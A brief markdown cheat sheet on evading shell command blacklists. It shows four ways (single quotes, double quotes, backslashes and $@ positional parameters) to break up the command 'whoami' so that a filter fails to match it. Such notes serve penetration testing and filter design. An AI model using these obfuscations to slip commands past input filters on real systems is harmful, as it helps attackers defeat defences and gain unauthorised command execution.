# Bypassing Blacklisted Commands

## Single Quotes

```shell
my@attack:~$ w'h'o'a'm'i'
```

## Double Quotes

```shell
my@attack:~$ w"h"o"a"m"i"
```

## Backslash

```shell
my@attack:~$ w\h\o\a\m\i
```

## [Positional Parameters](https://www.gnu.org/software/bash/manual/html_node/Special-Parameters.html#index-_0040)

```shell
my@attack:~$ w$@h$@o$@a$@m$@i
```
